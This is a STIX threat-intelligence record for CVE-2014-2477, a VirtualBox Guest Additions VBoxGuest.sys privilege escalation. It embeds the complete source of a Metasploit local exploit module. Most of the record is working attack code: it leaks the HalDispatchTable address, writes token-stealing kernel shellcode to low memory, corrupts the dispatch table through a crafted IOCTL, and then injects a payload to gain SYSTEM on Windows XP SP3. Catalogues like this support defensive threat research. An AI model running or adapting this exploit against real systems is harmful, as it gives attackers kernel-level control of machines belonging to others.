{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5b2f5307-75da-40af-93be-39347fdb55a2",
    "created": "2024-08-14T16:49:14.079823Z",
    "modified": "2024-08-14T16:49:14.079827Z",
    "name": "VirtualBox Guest Additions VBoxGuest.sys Privilege Escalation",
    "description": " A vulnerability within the VBoxGuest driver allows an attacker to inject memory they control into an arbitrary location they define. This can be used by an attacker to overwrite HalDispatchTable+0x4 and execute arbitrary code by subsequently calling NtQueryIntervalProfile on Windows XP SP3 systems. This has been tested with VBoxGuest Additions up to 4.3.10r93012.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/virtual_box_guest_additions.rb",
            "external_id": "virtual_box_guest_additions.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-2477"
        },
        {
            "source_name": "reference",
            "url": "https://www.korelogic.com/Resources/Advisories/KL-001-2014-001.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = AverageRanking\n\n  include Msf::Exploit::Local::WindowsKernel\n  include Msf::Post::File\n  include Msf::Post::Windows::FileInfo\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'VirtualBox Guest Additions VBoxGuest.sys Privilege Escalation',\n          'Description' => %q{\n            A vulnerability within the VBoxGuest driver allows an attacker to inject memory they\n            control into an arbitrary location they define. This can be used by an attacker to\n            overwrite HalDispatchTable+0x4 and execute arbitrary code by subsequently calling\n            NtQueryIntervalProfile on Windows XP SP3 systems. This has been tested with VBoxGuest\n            Additions up to 4.3.10r93012.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Matt Bergin <level[at]korelogic.com>', # Vulnerability discovery and PoC\n            'Jay Smith <jsmith[at]korelogic.com>' # MSF module\n          ],\n          'Arch' => ARCH_X86,\n          'Platform' => 'win',\n          'SessionTypes' => [ 'meterpreter' ],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread'\n          },\n          'Targets' => [\n            [\n              'Windows XP SP3',\n              {\n                'HaliQuerySystemInfo' => 0x16bba,\n                '_KPROCESS' => \"\\x44\",\n                '_TOKEN' => \"\\xc8\",\n                '_UPID' => \"\\x84\",\n                '_APLINKS' => \"\\x88\"\n              }\n            ]\n          ],\n          'References' => [\n            ['CVE', '2014-2477'],\n            ['URL', 'https://www.korelogic.com/Resources/Advisories/KL-001-2014-001.txt']\n          ],\n          'DisclosureDate' => '2014-07-15',\n          'DefaultTarget' => 0,\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_railgun_api\n                stdapi_sys_process_attach\n                stdapi_sys_process_memory_write\n              ]\n            }\n          }\n        }\n      )\n    )\n  end\n\n  def fill_memory(proc, address, length, content)\n    session.railgun.ntdll.NtAllocateVirtualMemory(-1, [ address ].pack('V'), nil, [ length ].pack('V'), 'MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN', 'PAGE_EXECUTE_READWRITE')\n\n    if !proc.memory.writable?(address)\n      vprint_error('Failed to allocate memory')\n      return nil\n    else\n      vprint_good(\"#{address} is now writable\")\n    end\n\n    result = proc.memory.write(address, content)\n\n    if result.nil?\n      vprint_error('Failed to write contents to memory')\n      return nil\n    else\n      vprint_good(\"Contents successfully written to 0x#{address.to_s(16)}\")\n    end\n\n    return address\n  end\n\n  def check\n    if sysinfo['Architecture'] == ARCH_X64\n      return Exploit::CheckCode::Safe\n    end\n\n    handle = open_device('\\\\\\\\.\\\\vboxguest', 'FILE_SHARE_WRITE|FILE_SHARE_READ', 0, 'OPEN_EXISTING')\n    if handle.nil?\n      return Exploit::CheckCode::Safe\n    end\n\n    session.railgun.kernel32.CloseHandle(handle)\n\n    version = get_version_info\n    if version != Msf::WindowsVersion::XP_SP3\n      return Exploit::CheckCode::Safe\n    end\n\n    file_path = get_env('WINDIR') << '\\\\system32\\\\drivers\\\\vboxguest.sys'\n    unless file?(file_path)\n      return Exploit::CheckCode::Unknown\n    end\n\n    major, minor, build, revision, branch = file_version(file_path)\n    vprint_status(\"vboxguest.sys file version: #{major}.#{minor}.#{build}.#{revision} branch: #{branch}\")\n\n    unless (major == 4)\n      return Exploit::CheckCode::Safe\n    end\n\n    case minor\n    when 0\n      return Exploit::CheckCode::Appears if build < 26\n    when 1\n      return Exploit::CheckCode::Appears if build < 34\n    when 2\n      return Exploit::CheckCode::Appears if build < 26\n    when 3\n      return Exploit::CheckCode::Appears if build < 12\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    if check == Exploit::CheckCode::Safe\n      fail_with(Failure::NotVulnerable, 'Exploit not available on this system')\n    end\n\n    handle = open_device('\\\\\\\\.\\\\vboxguest', 'FILE_SHARE_WRITE|FILE_SHARE_READ', 0, 'OPEN_EXISTING')\n    if handle.nil?\n      fail_with(Failure::NoTarget, 'Unable to open \\\\\\\\.\\\\vboxguest device')\n    end\n\n    print_status('Disclosing the HalDispatchTable address...')\n    hal_dispatch_table = find_haldispatchtable\n    if hal_dispatch_table.nil?\n      session.railgun.kernel32.CloseHandle(handle)\n      fail_with(Failure::Unknown, 'Failed to disclose HalDispatchTable')\n    else\n      print_good('Address successfully disclosed.')\n    end\n\n    print_status('Getting the hal.dll base address...')\n    hal_info = find_sys_base('hal.dll')\n    fail_with(Failure::Unknown, 'Failed to disclose hal.dll base address') if hal_info.nil?\n\n    hal_base = hal_info[0]\n    print_good(\"hal.dll base address disclosed at 0x#{hal_base.to_s(16).rjust(8, '0')}\")\n    hali_query_system_information = hal_base + target['HaliQuerySystemInfo']\n\n    print_status('Storing the shellcode in memory...')\n    this_proc = session.sys.process.open\n\n    restore_ptrs = \"\\x31\\xc0\" # xor eax, eax\n    restore_ptrs << \"\\xb8\" + [hali_query_system_information].pack('V') # mov eax, offset hal!HaliQuerySystemInformation\n    restore_ptrs << \"\\xa3\" + [hal_dispatch_table + 4].pack('V')        # mov dword ptr [nt!HalDispatchTable+0x4], eax\n\n    kernel_shell = token_stealing_shellcode(target)\n    kernel_shell_address = 0x1\n\n    buf = \"\\x90\" * 0x6000\n    buf[0, 56] = \"\\x50\\x00\\x00\\x00\" * 14\n    buf[0x5000, kernel_shell.length] = restore_ptrs + kernel_shell\n\n    result = fill_memory(this_proc, kernel_shell_address, buf.length, buf)\n    if result.nil?\n      session.railgun.kernel32.CloseHandle(handle)\n      fail_with(Failure::Unknown, 'Error while storing the kernel stager shellcode on memory')\n    else\n      print_good(\"Kernel stager successfully stored at 0x#{kernel_shell_address.to_s(16)}\")\n    end\n\n    print_status('Triggering the vulnerability, corrupting the HalDispatchTable...')\n    session.railgun.ntdll.NtDeviceIoControlFile(handle, nil, nil, nil, 4, 0x22a040, 0x1, 140, hal_dispatch_table + 0x4 - 40, 0)\n    session.railgun.kernel32.CloseHandle(handle)\n\n    print_status('Executing the Kernel Stager throw NtQueryIntervalProfile()...')\n    session.railgun.ntdll.NtQueryIntervalProfile(2, 4)\n\n    print_status('Checking privileges after exploitation...')\n\n    if is_system?\n      print_good('Exploitation successful!')\n    else\n      fail_with(Failure::Unknown, \"The exploitation wasn't successful\")\n    end\n\n    p = payload.encoded\n    print_status(\"Injecting #{p.length} bytes to memory and executing it...\")\n    if execute_shellcode(p)\n      print_good('Enjoy')\n    else\n      fail_with(Failure::Unknown, 'Error while executing the payload')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-07-15",
    "x_mitre_platforms": [
        "win'"
    ]
}